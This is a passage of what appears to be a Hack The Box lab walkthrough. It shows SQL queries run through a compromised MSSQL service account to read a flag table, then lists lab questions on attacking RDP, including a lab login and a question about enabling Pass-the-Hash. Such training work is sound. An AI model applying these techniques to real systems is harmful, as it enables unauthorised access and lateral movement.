Windows                         1      0   

SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> select table_name from information_schema.tables
table_name   
----------   
tb_flag      

SQL (WIN-02\mssqlsvc  WINSRV02\mssqlsvc@flagDB)> select * from tb_flag

flagvalue                              
------------------------------------   
b'HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}'   

```


### Attacking RDP

RDP to with user "htb-rdp" and password "HTBRocks!" 
10. What is the name of the file that was left on the Desktop? (Format example: filename.txt) 


11. Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol? 


12.  Connect via RDP with the Administrator account and submit the flag.txt as you answer. 